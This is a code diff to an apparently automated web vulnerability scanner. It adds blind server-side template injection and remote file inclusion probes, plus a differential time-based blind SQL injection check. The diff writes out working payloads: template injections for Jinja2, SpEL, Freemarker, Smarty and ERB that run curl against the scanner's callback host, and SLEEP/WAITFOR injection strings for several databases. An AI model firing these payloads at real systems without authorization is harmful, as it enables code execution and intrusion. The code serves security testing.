@@ -116,7 +116,9 @@ class UniversalProbeEngine:
         return findings
 
     # Classes whose confirmation needs an out-of-band callback (blind bugs).
-    _OOB_CLASSES = {"SSRF", "RCE", "XXE", "DNS_REBINDING"}
+    # SSTI included: a template that doesn't reflect the math canary can still be
+    # proven blind via an engine-native command→callback payload.
+    _OOB_CLASSES = {"SSRF", "RCE", "XXE", "DNS_REBINDING", "SSTI", "RFI"}
 
     def _oob_payloads(self, vuln_class: str, token) -> List[str]:
         """Technique templates (LOGIC) that embed our unique OOB URL/host so a
@@ -130,6 +132,22 @@ class UniversalProbeEngine:
                     f";nslookup {host}", f"& nslookup {host}", f"|nslookup {host}"]
         if vc == "XXE":
             return [f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{u}">]><r>&x;</r>']
+        if vc == "RFI":
+            # Remote file inclusion: point an include/fetch param at our OOB host.
+            # A callback proves the server retrieved a remote (attacker) resource.
+            return [u, token.https_url, f"{u}?", f"http://{host}/rfi.txt",
+                    f"//{host}/rfi.txt"]
+        if vc == "SSTI":
+            # Engine-native template payloads that shell out to our OOB host —
+            # a callback proves blind server-side template injection.
+            return [
+                f'{{{{lipsum.__globals__.os.popen("curl {u}").read()}}}}',            # Jinja2
+                f'{{{{cycler.__init__.__globals__.os.popen("curl {u}").read()}}}}',   # Jinja2
+                f'${{T(java.lang.Runtime).getRuntime().exec("curl {u}")}}',           # Spring SpEL
+                f'<#assign e="freemarker.template.utility.Execute"?new()>${{e("curl {u}")}}',  # Freemarker
+                f'{{system("curl {u}")}}',                                            # Smarty
+                f'#{{ %x(curl {u}) }}',                                               # ERB/Ruby
+            ]
         return []
 
     async def _run_oob(self, surface, point, vuln_class: str, ctx) -> List[Dict[str, Any]]:
@@ -272,6 +290,13 @@ class UniversalProbeEngine:
                 bf = await self._boolean_blind_sqli(surface, point, ctx, baseline)
                 if bf:
                     findings.append(bf)
+            # 3b. time-based blind SQLi — DIFFERENTIAL (benign baseline vs SLEEP(N),
+            #     confirmed by a repeat). Independent 2nd oracle: catches injections
+            #     with no error string and no boolean divergence.
+            if not findings and vuln_class.upper() == "SQLI":
+                tf = await self._time_blind_sqli(surface, point, ctx)
+                if tf:
+                    findings.append(tf)
             # 4. out-of-band confirmation for blind classes (no in-band signal)
             if not findings and vuln_class.upper() in self._OOB_CLASSES:
                 findings.extend(await self._run_oob(surface, point, vuln_class, ctx))
@@ -342,6 +367,62 @@ class UniversalProbeEngine:
                 f["status"] = "CONFIRMED"
                 ctx.add_vulnerability(f)
                 return f
+        return None
+
+    async def _time_blind_sqli(self, surface, point, ctx) -> Optional[Dict[str, Any]]:
+        """Differential time-based blind SQLi: confirm only when a SLEEP(N) payload
+        adds ~N seconds OVER a benign baseline AND the delay reproduces. Uses a
+        delta (not an absolute threshold) so slow endpoints don't false-positive,
+        and a confirm round so one-off jitter doesn't either."""
+        import os as _os
+        try:
+            n = max(2, min(15, int(_os.getenv("NEO_SQLI_SLEEP", "5"))))
+        except ValueError:
+            n = 5
+        need_ms = 0.8 * n * 1000.0          # delay we must observe over baseline
+        base_val = point.sample_value or "1"
+        ctxloc = self._context_for_location(point.location)
+
+        async def _elapsed(text: str) -> Optional[float]:
+            r = await self._inject_at_point(
+                surface, point,
+                Payload(vuln_class="sqli", payload_text=text, context=ctxloc))
+            return r.get("elapsed_ms") if r else None
+
+        # Benign baseline timing (no injected delay).
+        base = await _elapsed(base_val)
+        if base is None or base >= 0.5 * n * 1000.0:
+            return None  # unusable baseline / already-slow endpoint → skip (no FP)
+
+        sleepers = [
+            (f"{base_val}' AND SLEEP({n})-- -", "MySQL"),
+            (f"{base_val}\" AND SLEEP({n})-- -", "MySQL"),
+            (f"{base_val} AND SLEEP({n})", "MySQL"),
+            (f"{base_val}' || pg_sleep({n})-- -", "PostgreSQL"),
+            (f"{base_val}'; WAITFOR DELAY '0:0:{n}'-- -", "MSSQL"),
+            (f"{base_val}' AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})-- -", "Oracle"),
+        ]
+        for text, dbms in sleepers:
+            t1 = await _elapsed(text)
+            if t1 is None or (t1 - base) < need_ms:
+                continue
+            # Confirm: the delay must reproduce (kills jitter/one-off slowness).
+            t2 = await _elapsed(text)
+            if t2 is None or (t2 - base) < need_ms:
+                continue
+            p = Payload(vuln_class="sqli", payload_text=text, severity="HIGH")
+            from core.evidence.oracle import OracleResult
+            res = OracleResult(
+                True, 0.9, [p.payload_id],
+                f"Time-based blind SQLi ({dbms}): SLEEP({n}) added "
+                f"{(t1 - base) / 1000.0:.1f}s over {base / 1000.0:.1f}s baseline, "
+                f"reproduced ({(t2 - base) / 1000.0:.1f}s).")
+            f = self._build_finding(surface.url, f"{point.location}:{point.name}",
+                                    p, "SQLI", res, 0)
+            f["confirmed"] = True
+            f["status"] = "CONFIRMED"
+            ctx.add_vulnerability(f)
+            return f
         return None
 
     async def _baseline(self, surface, point) -> Optional[dict]:
